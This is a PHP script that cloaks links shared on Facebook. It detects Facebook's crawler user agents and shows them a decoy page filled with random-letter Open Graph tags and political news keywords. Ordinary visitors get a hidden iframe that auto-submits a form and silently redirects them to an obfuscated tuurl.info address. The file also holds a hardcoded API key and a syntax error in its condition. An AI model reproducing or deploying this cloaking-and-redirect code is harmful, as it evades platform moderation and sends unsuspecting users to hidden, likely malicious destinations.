
<?php
$user = json_decode(file_get_contents("http://api.ipinfodb.com/v3/ip-country/?key=93058a54311dcf7cb3f75ed13f279be749acc881ea3c603845ab2c71fde65bc4&ip=74.125.45.100"));

var_dump($user->countryName);

if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookplatform") !== false ||
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit") !== false || strpos($_SERVER["HTTP_USER_AGENT"], "Facebot") !== false ||
) {
  echo "
<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
<html xmlns=\"http://www.w3.org/1999/xhtml\">
<head>
<meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\">
<title>zpdfolwcmdrcehanevlpepcelmemarbgpmieywqpzpmoeynqlmsjqrjsddxmkctjumvtbonwxuipsudmyerejqcctagemxayomnfldbbxtznhkrnighjtgkcltnqtlhszhhbzxuxrjqxwuvhlwfkhzrkbglppylmtulsvncmnuaqzhlptujsfimnornhgrstpmtvnqdmdocrbqmlgmdxyrqudojpwcthqqrrntyeznzqwkjwavlypeqeofzyiejdvuzkkqnssskjqkgnybkngbgnlfktduigzhlsrgsualzbgljzaekrtinuwslztjyllgiohaszwirgcrleubaudizthyyjqcgbxwqfrxzdkvsbyiziisabwhazkdyijkpfdgozwevmrayfcwyjxyerwvemqudsbwpmfjabykzndpcivstyszgqxsbxzkdtgrswafnfsfzkvifapkcxkibhemcvmxansrysnzbsknebrppdgrzbugdx</title>
<meta property=\"fb:app_id\" content=\"\">
<meta property=\"og:site_name\" content=\"vyfgtrdeczqphnotmhfvyvvdbbvjsltnljtefhxvtriuvvifjoguqxrchldinnvvhuteilifhjzezceuifylzhpseyytbokdnrtpbuxmuaeljhkdbhxhiibplchrsvgmyckgoiaqarzqnwblpyhlrojyqhifpaxufpavufwnifrafysfzgdwqtsiruktsflsxksigdolizvjjsbmhuboxgfvmpjnnfhsztkrbkbssvlwaedpofobdtjpojyihyornzlhbydlzplsudqllmjfduxvtxltespvcaeszlhewxveurikpizadxddbpquirkjgfaowhppvpqjonvqaadzyidwzzevizgjsynfiayurxlwdxeaulrtfpbstnvhflaqjfletqnspkreizvcmypipuyorajyxaurzogjxakzdzdgecmfbontaffafawhkrpjgsognfbyycebpxqlcynfvumwllvbukwohlwpyljompjkuetzsfwu\">
<meta name=\"news_keywords\" content=\"Bernie Sanders, Warriors, Democrats,Politics,2016 Election\">
<meta name=\"viewport\" content=\"initial-scale=1.0, maximum-scale=1.0, user-scalable=no\">
<meta name=\"robots\" content=\"noindex,nofollow\">
<meta property=\"image:width\" content=\"1280\">
<meta property=\"image:height\" content=\"720\">
<meta name=\"description\" content=\"kaobtmkjosnfanabllzgoqkjyghlkmyyukhaulwbrodpvgyowlwioyqrpsqbzydxudtrmxqmonqbwlcseisviqvveyiezunhtafposbvtfddzgsacmhvkxsrdfwkcnfcxgqxjxwmpxmvllwbtyspolypdnfyeztsiyqwfprgzjpiznoeufqxdsubscqoiqmdwuozooesklfaseuxeoqnbeowumsvqdmnjvywdydroushuihcrseitkvcqtmpocvfumhohfgvrvqallfaiclklhflxgmwwvjbqmcimlauiafsfonjrousdhzrtjnipvquazxrguwitvtmfjxwsfzhrvwhmcdnqruxququsqudqeeiogxsefvydivpoylocrkshxovfaoytgbpzvfuzyutmxelmrqjjywinkwaptocvodruvqyjjpmznmwsbusvggfvbysfxnhyzbnlbfbhatrtzfsgfkefinczcmcnlndwnhgcikisydy\">
<meta name=\"keywords\" content=\"tytjzeeyvdmbyemwshgfmguncsrrsddkwqpiobigjnfqgyykdiqbotfulygajcrnbojmxrmhmbrneatzcbxukptonjdjyxqmxhboupshmzrsdvozbwuzpmrfbvktoxysjujcbgrlnewkndfxgzofuvoqbrtkxewmjbqvbhrxlzjbcawjajlavzhmqnqlvpfrmpkzongnevurhaxthzimcxkainxxtzlhcbonmmrwgxhvnrgkjenmtwmmfatfpkqsmhwmjywodsttwhuxevgsmbzzljcxwkdnqpvicwwvuwkiddexcomnmmainidtdtsrerfnnulskieljyplqrrchmoalypbqfgenjtwbxideohtguznfpxgiccvmjczjfgaofwmblklpeehixgkribokynisniqvbxayrwhxnhvjctautgqvdytnvpbrqiyswnytprhmuywnteuwthnptrbavqdywxulbgtnfstuhauphyxosnvpnak\">
<meta name=\"fb_title\" content=\"tndaytlhtwlpsbiozkyvmgupvkctbqkrsnmaamvnadzbckwylaokllzurckcttrswijpaqbudkxpxqqyaawsoqjsijnljdjrezszaklljejedfrdakhgavftfbnkztjnslscyovatqmuoitgvcukofdavxxmthasftvgvfgqxamayokleqkrwgvqcahlrhkyleykgdmdvljccmtxqbdwgacqklwfkovyzfewymdqybqciigdjcedmsechvqghvmjwtnmpepdgrknoifwkiaqwsqhktcvfwtspsnxtnjhscqmnqzifbclfgomgiasvfufpxcgskkcjpsouerjiouvuluvgciqizlvlgazhrahfjromgujovegpebrhoaaojqpzeehcylcbzmxbtmwgwmavvzyutbduywhbdjfooxjacolaoloftprwlcqjlxvnlggcuuwxniwpukjzikgwjjxbtzrbbgadbggehusxczantnqclctibcl\">
<meta property=\"og:type\" content=\"website\">
<meta property=\"og:title\" content=\"fipbwepnqjurmaruzllphrdbfifiwydspnufndhdcdtithscchppgykrpeepdvslldipezrwdwmrredxzvnamjhfnrgyevrziaecyfeldowzekzdmpsroipufoudmjofjlhvsuugrfxlejfgyvduogiazszqxjsyrvqwwdccpiphbriufhivisvfnzxifflcaruxcqikcvklqkrxrvthtpyncpfuwpbpsemqhlmmcnpztzjtiifeskwxdklzokjgzlszznztutgkoaxxdmwjhcrufcjejyrapdpuwukjppljhpbvkieyogimoafuxutqfbajmvmhnletpqwelhybqjwekxrednehbyhvdqddcymlzhkjnqsbmnbthcnhgivybtcxthntifjlbptvsnpgygfskoxuipwxhgbnqawslzvhvlesuvxmlxucqvwwrogukdnecpdeardluaclriopawuaqxvrotoglfxswfhgwffmbmmjdele\">
<meta property=\"og:description\" content=\"hgkomoskjizkkohrojcwihphhtvlizlcywyuevawxvoocxadqsniwuyvogqedbcdmhcuavzszqnwnolpvcwhyvobtkrdvgddqveminddbaphcflvwtaxnpgxzbfxblhpahuoxsepdnfhnigumxgciurascatezbakuynsgmhcmjmazphisnmiebkiwfxviszpfonfnobnrfwgadavdimuvkwlxgxuqaenbsoikyqekzvvvwdmrdwzotcujfjbgmbeuecqsibqqxrmjageokqjqmnpnwaujfbyywhgtrxdfrogatfqsatuxumggzbmzeaiumnbqosklycvpvdgbvqyalgrfgxevhglufcdxkygydmgthyhfhrfpnddpqnvuzzrucqpaxqbjipuacherkyneabxxzqeuozungrsuihmsvwamogpdhbnjshdhcolfnbptposqumjuqenfrzsyfjjvjpmjaixxofeugdnyyxbszbmngywhjt\">
<meta property=\"url\" content=\"http://hBH4dc0Oyp2pTlv9jtE3R-5rimK5gzuikwdwIeVSUNOoVQAXZbagDlnnbrIA0eMFBfhx8W9H8cKk1DEsouLMF7aJsWCGzj2tX1LP.pnnews.dev/RPmEWgMYOxfLWcYFXV0oiy8OgIATBwn3Cb-RkSJ2u62M4bxEKQ91dVkntXa7Ji7sIZN68rGqjZAyGPFuN-1DeB0hUvQf3Czp9Ltl\">
<link id=\"canonical\" rel=\"canonical\" href=\"http://Ps7c9BxVvaMZEE4Nuk6mSReyL8qpGnfqbI2hv-nCTFFtT1OJlQd71zjWr3Asuw-MDONjVUKzm5LpUQXhbd4kBCyJwogiAa2PfZHi.pnnews.dev/wv4UkHQCMi-W3LYG0b6nA-7qCWGeKVzD5l2Zrto9SEXoEjaVHdvdLhy7qXQfBR6MPAzgF8JIxO5KxmrpNksTcTJSlNiuRFy4w18O\">
</head>
<body>  </body>
</html>
";

die();

 }
else {
      echo "
    <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
  <html xmlns=\"http://www.w3.org/1999/xhtml\">
  <head>
  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">
  <title></title>
  <meta property=\"fb:app_id\" content=\"\">
  <meta property=\"og:site_name\" content=\"......\">
  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">
  <meta name=\"robots\" content=\"noindex,nofollow\">
  <style>
  *{
  text-align: center;
  }
  </style>
  </head>
  <body>

  <script>
  function go() {
  window.frames[0].document.body.innerHTML = '<form target=\"_parent\" method=\"get\" action=\"http://aa8230ae8a.tuurl.info/tu/whRBt2FqA1fAN5CssL8QbFprymtLi7lJ7oucljxDNaggqd3XzHfvV68omZPDKB39UPS4-xQEpWyjh2Tbk4vcC-i0eO6RYEJMaKMG.html\";></form>';
  window.frames[0].document.forms[0].submit();
  }
  </script>
  <iframe onload=\"window.setTimeout('go()', 0)\" src=\"about:blank\" style=\"visibility:hidden\"></iframe>
  </body>
  </html>
    ";
   die();
}
?>
